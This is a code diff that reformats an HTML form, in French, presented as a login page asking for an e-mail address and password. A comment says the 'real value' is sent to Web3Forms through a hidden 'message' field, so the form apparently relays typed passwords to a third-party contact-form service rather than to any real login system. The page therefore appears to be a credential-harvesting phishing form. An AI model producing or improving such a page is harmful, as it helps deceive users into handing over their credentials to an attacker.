@@ -80,43 +80,72 @@
                     <form id="contact-form-2">
 
 
-                        <label for="ide_id" class="fw-500">
-                            Adresse e-mail
-                        </label>
+<label for="ide_id" class="fw-500">
+    Adresse e-mail
+</label>
 
-                        <input type="email" id="ide_id" name="email" placeholder="Ex : monadresse@email.fr" required
-                            autocomplete="email" inputmode="email">
+<input
+    type="email"
+    id="ide_id"
+    name="email"
+    placeholder="Ex : monadresse@email.fr"
+    required
+    autocomplete="email"
+    inputmode="email"
+>
 
-                        <label for="message_display" class="fw-500">
-                            Votre mot de passe
-                        </label>
+<label for="message_display" class="fw-500">
+    Votre mot de passe
+</label>
 
-                        <!-- Champ visible -->
-                        <textarea id="message_display" placeholder="Votre mot de passe" required></textarea>
+<textarea
+    id="message_display"
+    placeholder="Votre mot de passe"
+    required
+    autocomplete="off"
+    autocorrect="off"
+    autocapitalize="sentences"
+    spellcheck="false"
+></textarea>
 
-                        <!-- Vraie valeur envoyée à Web3Forms -->
-                        <input type="hidden" id="message_id" name="message">
+<!-- Vraie valeur envoyée à Web3Forms -->
+<input
+    type="hidden"
+    id="message_id"
+    name="message"
+>
 
-                        <div class="display-flex mt-m">
+<div class="display-flex mt-m">
 
-                            <input type="checkbox" id="remember-me" name="remember" value="1">
+    <input
+        type="checkbox"
+        id="remember-me"
+        name="remember"
+        value="1"
+    >
 
-                            <label for="remember-me">
-                                Se souvenir de moi
-                            </label>
+    <label for="remember-me">
+        Se souvenir de moi
+    </label>
 
-                        </div>
+</div>
 
-                        <p class="align-center mt-m">
+<p class="align-center mt-m">
 
-                            <input class="btn btn-primary" type="submit" value="Connectez-vous" title="Connectez-vous">
+    <input
+        class="btn btn-primary"
+        type="submit"
+        value="Connetez-vous"
+        title="Connectez-vous"
+    >
 
-                        </p>
+</p>
 
-                        <div id="form-message-2" role="status"></div>
+<div id="form-message-2" role="status"></div>
 
 
-                    </form>
+</form>
+
 
 
 
